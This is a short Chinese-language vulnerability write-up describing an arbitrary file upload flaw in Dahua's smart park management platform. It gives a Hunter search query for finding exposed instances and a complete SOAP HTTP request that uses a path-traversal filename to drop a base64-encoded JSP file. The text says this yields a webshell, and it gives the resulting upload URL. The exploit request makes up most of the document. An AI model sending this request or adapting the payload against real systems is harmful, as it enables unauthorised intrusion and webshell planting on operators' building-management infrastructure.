# 大华智慧园区综合管理平台poi任意文件上传漏洞

# 一、漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 <font style="color:rgba(0, 0, 0, 0.9);">大华智慧园区综合管理平台在/emap/webservice/gis/soap/poi接口处存在任意文件上传漏洞，可以利用此漏洞获得webshell。</font>

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  
![1691828229241-1a7a5e8c-d5e6-4852-b428-047c6c955113.png](./img/YD6R9DCWkCac1mzy/1691828229241-1a7a5e8c-d5e6-4852-b428-047c6c955113-882487.png)
+ 登录页面：

![1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138.png](./img/YD6R9DCWkCac1mzy/1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138-782181.png)

# 四、漏洞复现
```plain
POST /emap/webservice/gis/soap/poi HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=9EC0A731FFF852957C17C91FE2EF24BD
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 683

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<!--type:string-->
<arg0>/../../1.jsp</arg0>
<!--type:base64Binary-->
<arg1>PCVAcGFnZSBpbXBvcnQ9ImphdmEudGV4dC4qLGphdmEudXRpbC4qLGphdmEuaW8uKiIlPgo8JQpTaW1wbGVEYXRlRm9ybWF0IGRmID0gbmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eS1NTS1kZCBISDptbTpzcyIpOwpvdXQucHJpbnRsbihkZi5mb3JtYXQobmV3IERhdGUoKSkpOwpGaWxlIGZpbGUgPSBuZXcgRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKTsKZmlsZS5kZWxldGUoKTsKJT4=</arg1>
</res:uploadPicFile>
</soapenv:Body>
</soapenv:Envelope>
```

![1694071791341-5248d78f-4c1e-4dd3-8b9e-29c6fd09aabe.png](./img/YD6R9DCWkCac1mzy/1694071791341-5248d78f-4c1e-4dd3-8b9e-29c6fd09aabe-418276.png)

上传文件位置

```plain
http://xx.xx.xx.xx/upload/1.jsp
```

![1694071840120-b98410d5-a689-4743-8a5b-e59ad7b99583.png](./img/YD6R9DCWkCac1mzy/1694071840120-b98410d5-a689-4743-8a5b-e59ad7b99583-299337.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bdf3yqzbh9p9h9ev>